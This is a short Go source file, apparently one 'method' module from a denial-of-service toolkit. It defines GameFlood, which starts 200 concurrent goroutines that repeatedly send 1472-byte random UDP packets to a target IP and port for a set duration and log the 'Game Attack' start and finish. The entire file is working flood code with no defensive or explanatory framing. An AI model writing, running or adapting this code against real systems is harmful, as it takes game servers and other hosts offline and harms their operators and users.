package methods

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"
)

func GameFlood(ctx context.Context, IP, PORT string, SECONDS int) {
	var wg sync.WaitGroup
	fmt.Printf("[%s] Game Attack started: %s:%s for %ds\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS)

	payload := make([]byte, 1472)
	rand.Read(payload)
	addr := net.JoinHostPort(IP, PORT)

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, _ := net.Dial("udp", addr)
			if conn == nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn.Write(payload)
				}
			}
		}()
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Printf("[%s] Game Attack finished.\n", time.Now().Format("15:04:05"))
}
